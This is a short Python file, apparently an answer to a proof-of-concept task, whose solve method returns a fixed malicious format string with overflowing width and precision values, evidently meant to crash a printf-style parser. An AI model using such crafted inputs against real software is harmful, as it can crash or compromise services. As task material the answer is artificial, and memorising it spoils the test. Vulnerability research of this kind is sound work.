import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"%9223372036854775807.922337203685477580d"
        return poc